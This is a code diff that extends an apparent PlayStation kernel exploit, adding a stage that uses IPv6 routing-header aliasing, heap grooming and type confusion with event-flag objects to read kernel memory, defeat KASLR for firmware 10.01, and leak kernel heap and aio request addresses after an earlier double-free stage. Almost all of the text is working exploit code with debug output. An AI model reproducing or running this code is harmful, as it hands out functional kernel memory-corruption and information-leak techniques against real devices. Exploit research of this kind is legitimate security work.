@@ -78,10 +78,11 @@ int32_t cpu_affinity_priority()
         return err;
 }
 
-#define NUM_SDS 100 // Adjust later
+#define NUM_SDS 100
 #define NUM_WORKERS 2
 #define NUM_GROOM_IDS 0x200
-#define NUM_GROOM_REQS 3 // Chosen to maximize the number of 0x80 malloc allocs per submission
+// Max number of req allocations per submission in one 0x80 malloc slab (3)
+#define NUM_GROOM_REQS (0x80 / sizeof(SceKernelAioRWRequest))
 
 struct setup_s
 {
@@ -192,9 +193,6 @@ void setup()
         printf_debug("* errno value %d\n", read_errno());
 }
 
-#define NUM_ALIAS 100
-#define MARKER_OFFSET 4
-
 struct in6_addr
 {
     uint8_t s6_addr[16];
@@ -216,33 +214,35 @@ struct ip6_rthdr
     uint8_t  _pad[pad] = {0};
 };
 
-int32_t aliased_rthdrs_sds[2] = {0};
+#define NUM_ALIAS 100
+int32_t sd_pair[2] = {0};
 
 int32_t make_aliased_rthdrs()
 {
     int32_t *sds = setup_data.sds;
     ip6_rthdr<0x80> rthdr;
-    ip6_rthdr<0x80> rthdr2;
 
-    for (int32_t loop = 0; loop < NUM_ALIAS; loop++) {
-        for (int32_t i = 0; i < NUM_SDS; i++) {
+    for (uint32_t loop = 0; loop < NUM_ALIAS; loop++) {
+        for (uint32_t i = 0; i < NUM_SDS; i++) {
             if (sds[i] < 0) continue; // Skip invalid sockets
             rthdr.ip6r_reserved = i; // Set a unique marker for each rthdr
             set_rthdr(sds[i], &rthdr, rthdr.used_size);
         }
 
-        for (int32_t i = 0; i < NUM_SDS; i++) {
+        for (uint32_t i = 0; i < NUM_SDS; i++) {
             if (sds[i] < 0) continue; // Skip invalid sockets
             socklen_t len = rthdr.used_size;
-            if (get_rthdr(sds[i], &rthdr2, &len) != 0) continue;
-            if (rthdr2.ip6r_reserved == i) continue;
-            printf_debug("Aliased rthdrs found at attempt: %d\n", loop);
-            aliased_rthdrs_sds[0] = sds[i];
-            aliased_rthdrs_sds[1] = sds[rthdr2.ip6r_reserved];
-            printf_debug("aliased_rthdrs_sds: %d %d\n",
-                aliased_rthdrs_sds[0], aliased_rthdrs_sds[1]);
+            if (get_rthdr(sds[i], &rthdr, &len) != 0) continue;
+            if (rthdr.ip6r_reserved == i) continue; // rthdr not aliased
+            printf_debug("Aliased rthdrs %d & %d found at attempt: %d\n",
+                i, rthdr.ip6r_reserved, loop);
+            hexdump((uint8_t*)&rthdr, 0x80);
+            sd_pair[0] = sds[i];
+            sd_pair[1] = sds[rthdr.ip6r_reserved];
+            printf_debug("sd_pair: %d %d\n",
+                sd_pair[0], sd_pair[1]);
             sds[i] = -1;
-            sds[rthdr2.ip6r_reserved] = -1;
+            sds[rthdr.ip6r_reserved] = -1;
             free_rthdrs(sds, NUM_SDS);
             return 0;
         }
@@ -533,6 +533,242 @@ int32_t double_free_reqs()
     return -1;
 }
 
+struct aio_entry
+{
+    uint32_t ar2_cmd;              // 0x00
+    uint32_t ar2_ticket;           // 0x04
+    uint8_t _unk1[8];              // 0x08
+    ptr64_t ar2_reqs1;             // 0x10
+    ptr64_t ar2_info;              // 0x18
+    ptr64_t ar2_batch;             // 0x20
+    ptr64_t ar2_spinfo;            // 0x28
+    SceKernelAioResult ar2_result; // 0x30
+    uint64_t ar2_file;             // 0x40
+    ptr64_t _unkptr1;              // 0x48
+    ptr64_t ar2_qentry;            // 0x50
+    // align to 0x80
+    uint8_t _pad2[0x28];
+};
+
+bool verify_reqs2(aio_entry *reqs2)
+{
+    uint32_t prefix = 0;
+
+    if (reqs2->ar2_cmd != SCE_KERNEL_AIO_CMD_WRITE)
+        return false;
+
+    // Example of heap addresses: 0xfffff0970a1e8780
+    // They all should be prefixed by 0xffff
+    if (reqs2->ar2_reqs1 >> 8*6 != 0xffff)
+        return false;
+    // and they must share the first 4 bytes (e.g. 0xfffff097)
+    prefix = reqs2->ar2_reqs1 >> 8*4;
+
+    if (reqs2->ar2_info >> 8*4 != prefix)
+        return false;
+    if (reqs2->ar2_batch >> 8*4 != prefix)
+        return false;
+
+    // state must be in the range [1,4], and _pad must be 0
+    if (!(0 < reqs2->ar2_result.state && reqs2->ar2_result.state <= 4))
+        return false;
+    if (reqs2->ar2_result._pad != 0)
+        return false;
+
+    // ar2_file must be NULL since we passed a bad file descriptor to
+    // aio_submit_cmd()
+    if (reqs2->ar2_file != 0) {
+        return false;
+    }
+
+    if (reqs2->_unkptr1 != 0) // Offset 0x48 can be NULL
+    if (reqs2->_unkptr1 >> 8*4 != prefix)
+        return false;
+
+    if (reqs2->ar2_qentry >> 8*4 != prefix)
+        return false;
+
+    return true;
+}
+
+#define NUM_LEAKED_BLOCKS 16
+#define NUM_HANDLES 256
+// Max number of req allocations per submission in one 0x100 malloc slab (6)
+#define NUM_ELEMS (0x100 / sizeof(SceKernelAioRWRequest))
+#define NUM_LEAKS 5
+
+int32_t leak_kernel_addrs()
+{
+    printf_debug("STAGE: Leak kernel addresses\n");
+
+    PS::close(sd_pair[1]);
+    uint8_t buf[0x80 * NUM_LEAKED_BLOCKS] = {0};
+    socklen_t len = 0x80;
+
+    // Type confuse a struct evf with a struct ip6_rthdr
+    printf_debug("* Confuse evf with rthdr\n");
+
+    SceKernelEventFlag evfs[NUM_HANDLES];
+    SceKernelEventFlag evf = 0;
+
+    for (uint32_t i = 0; i < NUM_ALIAS; i++)
+    {
+        PS2::memset(evfs, 0, sizeof(evfs));
+        for (uint32_t j = 0; j < NUM_HANDLES; j++)
+            // By setting evf flags to >= 0x0f00, the value rthdr.ip6r_len will
+            // be 0x0f (15), allowing to leak the full contents of the rthdr.
+            // `| j << 16` bitwise shenanigans will help locating evfs later
+            new_evf(&evfs[j], 0x0f00 | j << 16);
+
+        get_rthdr(sd_pair[0], buf, &len);
+        uint32_t bit_pattern = ((uint32_t*)buf)[0];
+        if ((bit_pattern >> 16) < NUM_HANDLES)
+        {
+            evf = evfs[bit_pattern >> 16];
+            // Confirm our finding
+            set_evf_flags(evf, bit_pattern | 1);
+            get_rthdr(sd_pair[0], buf, &len);
+            if (((uint32_t*)buf)[0] == (bit_pattern | 1))
+                evfs[bit_pattern >> 16] = 0;
+            else
+                evf = 0;
+        }
+
+        for (uint32_t j = 0; j < NUM_HANDLES; j++)
+            if (evfs[j] != 0) free_evf(evfs[j]);
+
+        if (evf == 0) continue;
+        printf_debug("Confused rthdr and evf at attempt: %d\n", i);
+        hexdump(buf, 0x80);
+        break;
+    }
+
+    if (evf == 0)
+    {
+        printf_debug("Failed to confuse evf with rthdr!\n");
+        return -1;
+    }
+
+    // Fields we use from evf:
+    // struct evf:
+    //     uint64_t flags // 0x0
+    //     struct {
+    //         uint64_t cv_description; // 0x28: pointer to "evf cv"
+    //         ...
+    //     } cv;
+    //     struct { // TAILQ_HEAD(struct evf_waiter)
+    //         struct evf_waiter *tqh_first; // 0x38: pointer to first waiter
+    //         struct evf_waiter **tqh_last; // 0x40: pointer to last's next
+    //     } waiters;
+
+    // evf.cv.cv_description = "evf cv"
+    // string is located at the kernel's mapped ELF file
+    // 0x007b5133 "evf cv" for FW 10.01.
+    ptr64_t evf_cv_str_p = *(uint64_t*)(&buf[0x28]);
+
+    printf_debug("\"evf cv\" string address found! %p\n", evf_cv_str_p);
+    printf_debug("DEFEATED KASLR! Kernel base (10.01): %p\n",
+        evf_cv_str_p - 0x007b5133);
+
+    // Because of TAILQ_INIT() (a linked list macro), we have:
+    // evf.waiters.tqh_last == &evf.waiters.tqh_first (closed loop)
+    // It's the real address of the leaked `evf` object in the kernel heap
+    // For what are we going to use this??
+    ptr64_t evf_p = *(uint64_t*)(&buf[0x40]) - (uint64_t)0x38;
+    
+    // %p only works for 64-bit addresses when prefixed with 0xffffffff
+    // for some reason.. We can blame PS2::vsprintf for that.
+    printf_debug("Leaked evf address (kernel heap): 0x%08x%08x\n",
+        (uint32_t)(evf_p >> 32), (uint32_t)evf_p);
+
+    // Setting rthdr.ip6r_len to 0xff, allowing to read the next 0x80 blocks,
+    // leaking adjacent objects
+    set_evf_flags(evf, 0xff00);
+    len *= NUM_LEAKED_BLOCKS;
+
+    // Use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of
+    // the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket
+    // field ???
+    ptr64_t ucred = evf_p + 4;
+
+    SceKernelAioRWRequest leak_reqs[NUM_ELEMS] = {0};
+    SceKernelAioSubmitId leak_ids[NUM_ELEMS * NUM_HANDLES] = {0};
+
+    leak_reqs[0].buf = ucred;
+    for (uint32_t i = 0; i < NUM_ELEMS; i++)
+        leak_reqs[i].fd = -1;
+
+    printf_debug("* Find aio_entry\n");
+
+    uint32_t reqs2_off = 0;
+    for (uint32_t i = 0; i < NUM_LEAKS; i++) {
+        spray_aio(
+            leak_ids,
+            NUM_HANDLES,
+            leak_reqs,
+            NUM_ELEMS,
+            true,
+            SCE_KERNEL_AIO_CMD_WRITE
+        );
+        get_rthdr(sd_pair[0], buf, &len);
+        for (uint32_t off = 0x80; off < len; off += 0x80) {
+            if (!verify_reqs2((aio_entry *)&buf[off])) continue;
+            reqs2_off = off;
+            printf_debug("Found reqs2 at attempt: %d\n", i);
+            hexdump(&buf[off], 0x80);
+            goto loop_break;
+        }
+        free_aios(leak_ids, NUM_ELEMS * NUM_HANDLES);
+    }
+    loop_break:
+
+    if (reqs2_off == 0) {
+        printf_debug("Could not leak a reqs2!\n");
+        return -1;
+    }
+    printf_debug("reqs2 offset: %p\n", reqs2_off);
+    aio_entry *req2 = (aio_entry *)&buf[reqs2_off];
+
+    ptr64_t reqs1 = req2->ar2_reqs1;
+    printf_debug("reqs1: 0x%08x%08x\n", (uint32_t)(reqs1 >> 32), (uint32_t)reqs1);
+    reqs1 &= -0x100LL;
+    printf_debug("reqs1: 0x%08x%08x\n", (uint32_t)(reqs1 >> 32), (uint32_t)reqs1);
+
+    printf_debug("* Searching target_id\n");
+    SceKernelAioSubmitId target_id = 0;
+    SceKernelAioSubmitId *to_cancel_p = 0;
+    uint32_t to_cancel_len = 0;
+
+    for (uint32_t i = 0; i < NUM_ELEMS * NUM_HANDLES; i += NUM_ELEMS)
+    {
+        aio_multi_cancel(&leak_ids[i], NUM_ELEMS, aio_errs);
+        get_rthdr(sd_pair[0], buf, &len);
+        if (req2->ar2_result.state != SCE_KERNEL_AIO_STATE_ABORTED) continue;
+        printf_debug("Found target_id at batch: %d\n", i / NUM_ELEMS);
+        hexdump((uint8_t *)req2, 0x80);
+        // Why do we assume that target_id is the first one in the batch?
+        // It could be any of the `NUM_ELEMS`, right?
+        target_id = leak_ids[i];
+        leak_ids[i] = 0; // target_id won't be processed by free_aios2
+        printf_debug("target_id: %p\n", target_id);
+        to_cancel_p = &leak_ids[i + NUM_ELEMS];
+        to_cancel_len = (NUM_ELEMS * NUM_HANDLES) - (i + NUM_ELEMS);
+        break;
+    }
+
+    if (target_id == 0)
+    {
+        printf_debug("Failed to find target_id!\n");
+        free_aios(leak_ids, NUM_ELEMS * NUM_HANDLES);
+        return -1;
+    }
+
+    cancel_aios(to_cancel_p, to_cancel_len);
+    free_aios2(leak_ids, NUM_ELEMS * NUM_HANDLES);
+
+    return 0;
+}
+
 void main()
 {
     // PS2 Breakout
@@ -556,7 +792,13 @@ void main()
     err = double_free_reqs();
     if (err) goto end;
 
+    // STAGE: Leak kernel addresses
+    err = leak_kernel_addrs();
+    if (err) goto end;
+
     end:
+        PS::close(setup_data.unixpair.unblock_fd);
+        PS::close(setup_data.unixpair.block_fd);
         if (err != 0)
         {
             printf_debug("Something went wrong! Error: %d\n", err);
